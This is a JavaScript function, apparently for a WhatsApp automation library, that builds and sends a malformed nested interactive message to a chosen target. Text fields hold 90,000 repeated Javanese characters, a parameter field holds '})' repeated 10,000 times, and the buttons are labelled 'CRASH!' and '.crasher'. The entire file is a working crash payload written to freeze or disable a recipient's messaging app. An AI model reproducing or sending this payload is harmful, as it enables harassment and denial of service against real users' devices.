async function bak2(target) {
    await sock.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {
                    text: 
                      "ijin mintol"+
                      "ꦾ".repeat(90000),
                  },
                  carouselMessage: {
                    cards: [
                      {
                        header: {
                          hasMediaAttachment: true,
                          ...(await prepareWAMessageMedia(
                            {
                              image: {
                                url: "https://files.catbox.moe/m33kq5.jpg",
                              },
                            },
                            { upload: sock.waUploadToServer }
                          )),
                        },
                        body: {
                          text: "bang ijin puskon" + "ꦾ".repeat(90000),
                        },
                        nativeFlowMessage: {
                          buttons: [
                            {
                              name: "cta_url",
                              buttonParamsJson: JSON.stringify({
                                display_text: "@6285789034010",
                                url: "https://t.me/YukinaDevils",
                                merchant_url: "https://t.me/YukinaDevils",
                              }),
                            },
                            {
                              name: "single_select",
                              buttonParamsJson: JSON.stringify({
                                title: "@6285789034010",
                                sections: [
                                  {
                                    title: "@6285789034010",
                                    rows: [],
                                  },
                                ],
                              }),
                            },
                            {
                              name: "quick_reply",
                              buttonParamsJson: JSON.stringify({
                                display_text: "DIEE!!!",
                                title: "CRASH!",
                                id: ".crasher",
                              }),
                            },
                          ],
                        },
                      },
                    ],
                    messageVersion: 1,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: nomor },
        messageParamsJson: "})".repeat(10000)
      }
    );
}